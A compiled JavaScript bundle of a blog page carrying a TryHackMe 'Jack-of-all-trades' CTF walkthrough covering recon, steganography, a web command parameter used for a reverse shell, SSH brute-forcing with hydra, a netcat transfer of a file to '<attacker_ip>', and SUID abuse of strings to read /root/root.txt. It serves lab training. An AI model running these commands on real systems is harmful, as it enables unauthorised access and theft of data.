"use strict";(self.webpackChunkcybersec_notes=self.webpackChunkcybersec_notes||[]).push([[4715],{3905:function(e,t,n){n.d(t,{Zo:function(){return c},kt:function(){return m}});var a=n(67294);function r(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){r(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,a,r=function(e,t){if(null==e)return{};var n,a,r={},o=Object.keys(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||(r[n]=e[n]);return r}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(a=0;a<o.length;a++)n=o[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(r[n]=e[n])}return r}var l=a.createContext({}),p=function(e){var t=a.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},c=function(e){var t=p(e.components);return a.createElement(l.Provider,{value:t},e.children)},u={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},d=a.forwardRef((function(e,t){var n=e.components,r=e.mdxType,o=e.originalType,l=e.parentName,c=s(e,["components","mdxType","originalType","parentName"]),d=p(n),m=r,h=d["".concat(l,".").concat(m)]||d[m]||u[m]||o;return n?a.createElement(h,i(i({ref:t},c),{},{components:n})):a.createElement(h,i({ref:t},c))}));function m(e,t){var n=arguments,r=t&&t.mdxType;if("string"==typeof e||r){var o=n.length,i=new Array(o);i[0]=d;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s.mdxType="string"==typeof e?e:r,i[1]=s;for(var p=2;p<o;p++)i[p]=n[p];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}d.displayName="MDXCreateElement"},3827:function(e,t,n){n.r(t),n.d(t,{frontMatter:function(){return s},contentTitle:function(){return l},metadata:function(){return p},assets:function(){return c},toc:function(){return u},default:function(){return m}});var a=n(87462),r=n(63366),o=(n(67294),n(3905)),i=["components"],s={title:"THM Jack-of-all-trades writeup",description:"Tryhackme Jack-of-all-trades room writeup",authors:["shivam"],image:"https://tryhackme-images.s3.amazonaws.com/room-icons/baa244c10b8308efe5d3956cc1c73db6.jpeg",slug:"jack-of-all-trades",tags:["stegnography","strings","SUID"]},l=void 0,p={permalink:"/Cybernotes/blog/jack-of-all-trades",source:"@site/blog/2022-03-02-JackofAllTrades/jackofAllTrades.md",title:"THM Jack-of-all-trades writeup",description:"Tryhackme Jack-of-all-trades room writeup",date:"2022-03-02T00:00:00.000Z",formattedDate:"March 2, 2022",tags:[{label:"stegnography",permalink:"/Cybernotes/blog/tags/stegnography"},{label:"strings",permalink:"/Cybernotes/blog/tags/strings"},{label:"SUID",permalink:"/Cybernotes/blog/tags/suid"}],readingTime:3.485,truncated:!0,authors:[{name:"0xSH1V4M",title:"Author",url:"https://github.com/shivam1317",imageURL:"https://avatars.githubusercontent.com/u/70281451?v=4",key:"shivam"}],frontMatter:{title:"THM Jack-of-all-trades writeup",description:"Tryhackme Jack-of-all-trades room writeup",authors:["shivam"],image:"https://tryhackme-images.s3.amazonaws.com/room-icons/baa244c10b8308efe5d3956cc1c73db6.jpeg",slug:"jack-of-all-trades",tags:["stegnography","strings","SUID"]},prevItem:{title:"THM IDE writeup",permalink:"/Cybernotes/blog/ide"},nextItem:{title:"THM Agent sudo writeup",permalink:"/Cybernotes/blog/agent-sudo"}},c={authorsImageUrls:[void 0]},u=[{value:"Nmap results",id:"nmap-results",children:[],level:2},{value:"Gobuster results",id:"gobuster-results",children:[],level:2},{value:"Enumration",id:"enumration",children:[],level:2},{value:"Privesc",id:"privesc",children:[],level:2}],d={toc:u};function m(e){var t=e.components,s=(0,r.Z)(e,i);return(0,o.kt)("wrapper",(0,a.Z)({},d,s,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("p",null,"Hello everyone,"),(0,o.kt)("p",null,"Today we are going to solve Jack-of-all-trades machine from tryhackme. we will learn about how to open restricted port on browser,some stegnography and how to do privesc with strings SUID."),(0,o.kt)("p",null,(0,o.kt)("img",{parentName:"p",src:"https://tryhackme-images.s3.amazonaws.com/room-icons/baa244c10b8308efe5d3956cc1c73db6.jpeg",alt:null})),(0,o.kt)("h2",{id:"nmap-results"},"Nmap results"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"PORT   STATE SERVICE VERSION\n22/tcp open  http    Apache httpd 2.4.10 ((Debian))\n|_http-server-header: Apache/2.4.10 (Debian)\n|_http-title: Jack-of-all-trades!\n|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)\n80/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)\n| ssh-hostkey:\n|   1024 13:b7:f0:a1:14:e2:d3:25:40:ff:4b:94:60:c5:00:3d (DSA)\n|   2048 91:0c:d6:43:d9:40:c3:88:b1:be:35:0b:bc:b9:90:88 (RSA)\n|   256 a3:fb:09:fb:50:80:71:8f:93:1f:8d:43:97:1e:dc:ab (ECDSA)\n|_  256 65:21:e7:4e:7c:5a:e7:bc:c6:ff:68:ca:f1:cb:75:e3 (ED25519)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n")),(0,o.kt)("p",null,"--\x3e If you are facing the problem with firefox about restricted port so here is the quick guide to help you :"),(0,o.kt)("p",null,"1.open a new tab and search for ",(0,o.kt)("inlineCode",{parentName:"p"},"about:config"),"\n2.Then you will see one search bar. Type ",(0,o.kt)("inlineCode",{parentName:"p"},"network.security.ports.banned.override")," and if it appears then double click on it and add the port which you want to allow(in our case 22)\n3.If it doesn't appear then make one new by clicking on ",(0,o.kt)("inlineCode",{parentName:"p"},"+")," icon and select type as integer and add ",(0,o.kt)("inlineCode",{parentName:"p"},"22")," in it and save it and you are good to go!"),(0,o.kt)("p",null,"After configuration it will look like this !"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(24010).Z,width:"1917",height:"643"})),(0,o.kt)("p",null,"--\x3e Now we can goto that port and i found this page there !"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(99226).Z,width:"1892",height:"847"})),(0,o.kt)("h2",{id:"gobuster-results"},"Gobuster results"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"===============================================================\n/.htpasswd            (Status: 403) [Size: 278]\n/.htaccess            (Status: 403) [Size: 278]\n/assets               (Status: 301) [Size: 318] [--\x3e http://10.10.223.122:22/assets/]\n/index.html           (Status: 200) [Size: 1605]\n/server-status        (Status: 403) [Size: 278]\n===============================================================\n")),(0,o.kt)("h2",{id:"enumration"},"Enumration"),(0,o.kt)("p",null,"--\x3e Found this in the comment of the page on port ",(0,o.kt)("inlineCode",{parentName:"p"},"22")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"Remember to wish Johny Graves well with his crypto jobhunting! His encoding systems are amazing! Also gotta remember your password: u?WtKSraq\n")),(0,o.kt)("p",null,"Possible name : ",(0,o.kt)("inlineCode",{parentName:"p"},"Johny"),"\nalso got one password : ",(0,o.kt)("inlineCode",{parentName:"p"},"u?WtKSraq")),(0,o.kt)("p",null,"--\x3e Also got this in comment :"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"Note to self - If I ever get locked out I can get back in at /recovery.php\n")),(0,o.kt)("p",null,"--\x3e Got this page in ",(0,o.kt)("inlineCode",{parentName:"p"},"/recovery.php")),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(26848).Z,width:"1563",height:"387"})),(0,o.kt)("p",null,"--\x3e Also in comment i found this string:"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(9292).Z,width:"1548",height:"723"})),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"Remember that the credentials to the recovery login are hidden on the homepage! I know how forgetful you are, so here's a hint: bit.ly/2TvYQ2S\n")),(0,o.kt)("p",null,"--\x3e The link redirects us to the wikipedia page for ",(0,o.kt)("inlineCode",{parentName:"p"},"Stegosauria")," so here we have to do some stegnography."),(0,o.kt)("p",null,"--\x3e I went to ",(0,o.kt)("inlineCode",{parentName:"p"},"/assets")," and found 3 images: ",(0,o.kt)("inlineCode",{parentName:"p"},"header.jpg"),",",(0,o.kt)("inlineCode",{parentName:"p"},"stego.jpg")," and ",(0,o.kt)("inlineCode",{parentName:"p"},"jackinthebox.jpg"),". So let's do stego on them one by one!"),(0,o.kt)("p",null,"--\x3e Found the creds from ",(0,o.kt)("inlineCode",{parentName:"p"},"header.jpg")," by stego using ",(0,o.kt)("inlineCode",{parentName:"p"},"u?WtKSraq")," as password !"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"Here you go Jack. Good thing you thought ahead!\n\nUsername: jackinthebox\nPassword: TplFxiSHjY\n")),(0,o.kt)("p",null,"--\x3e Found this in ",(0,o.kt)("inlineCode",{parentName:"p"},"stego.jpg")," using same password as ",(0,o.kt)("inlineCode",{parentName:"p"},"header.jpg")),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"Hehe. Gotcha!\n\nYou're on the right path, but wrong image!\n")),(0,o.kt)("p",null,"But we already found username and password so let's try to login on ",(0,o.kt)("inlineCode",{parentName:"p"},"/recovery.php")),(0,o.kt)("p",null,"--\x3e And boom it worked!"),(0,o.kt)("p",null,"And i found the page which says this :"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"GET me a 'cmd' and I'll run it for you Future-Jack.\n")),(0,o.kt)("p",null,"--\x3e So i tried ",(0,o.kt)("inlineCode",{parentName:"p"},"cmd")," as parameter and it worked ! So i tried to get the reverse shell with that parameter and i got the shell as ",(0,o.kt)("inlineCode",{parentName:"p"},"www-data")),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(57149).Z,width:"1315",height:"291"})),(0,o.kt)("p",null,"--\x3e In ",(0,o.kt)("inlineCode",{parentName:"p"},"/home")," directory i found one file called ",(0,o.kt)("inlineCode",{parentName:"p"},"jacks_password_list")," so it might be a ssh passwords of jack so i grabbed them and ran hydra"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"hydra -l jack -P jacks_password_list.txt ssh://<ip>:80 -t 10\n")),(0,o.kt)("p",null,"--\x3e Found jack's password !"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(39541).Z,width:"1911",height:"323"})),(0,o.kt)("p",null,(0,o.kt)("inlineCode",{parentName:"p"},"jack:ITMJpGGIqg1jn?>@")),(0,o.kt)("p",null,"--\x3e But we don't have user flag here! instead we have one image so let's transfer this using netcat into our machine !"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"#Victim machine\nnc <attacker_ip> <port> < user.jpg\n\n#Attacker machine\nnc -lp <port> > user.jpg\n")),(0,o.kt)("p",null,"--\x3e After opening the image i found the flag !"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(47015).Z,width:"1221",height:"897"})),(0,o.kt)("h2",{id:"privesc"},"Privesc"),(0,o.kt)("p",null,"--\x3e I done ",(0,o.kt)("inlineCode",{parentName:"p"},"sudo -l")," but found nothing so i tried to find the ",(0,o.kt)("inlineCode",{parentName:"p"},"SUID")," files with this command :"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},"find / -perm -u=s -type f 2>/dev/null\n")),(0,o.kt)("p",null,"--\x3e And i found some files in which ",(0,o.kt)("inlineCode",{parentName:"p"},"/usr/bin/strings")," looks interesting !"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(1089).Z,width:"1207",height:"431"})),(0,o.kt)("p",null,"--\x3e So i searched on gtfobins and i found that we can read any file with strings so let's read ",(0,o.kt)("inlineCode",{parentName:"p"},"/root/root.txt")," with it !"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-bash"},'LFILE=/root/root.txt\n/usr/bin/strings "$LFILE"\n')),(0,o.kt)("p",null,"--\x3e And i found the root flag!"),(0,o.kt)("p",null,(0,o.kt)("img",{src:n(79634).Z,width:"1607",height:"229"})))}m.isMDXComponent=!0},9292:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220109120618-845444fbb1ea29dd43ef1e6d4a8bf7e2.png"},26848:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220109120648-13005264aa3f793802d21371095e5b0b.png"},57149:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220109121928-fe7ad23cbf90884177731ca4745c16e2.png"},39541:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220109122405-c57b2b8436d04c3673acd7d94ef35c72.png"},47015:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220109124032-cf1d110c68c93e2cc85a49b1df4bb9f8.png"},1089:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220109124226-491b88e1b0b5d41f5e9d664c176dcd4f.png"},79634:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220109124346-d24ae3f9ea60f35628c35b70dad3e782.png"},24010:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220109125326-44a4aac3ce3270cd35bcd4c7be52f9e8.png"},99226:function(e,t,n){t.Z=n.p+"assets/images/Pastedimage20220109125419-49ccedaccd890a079a6496734844b4e3.png"}}]);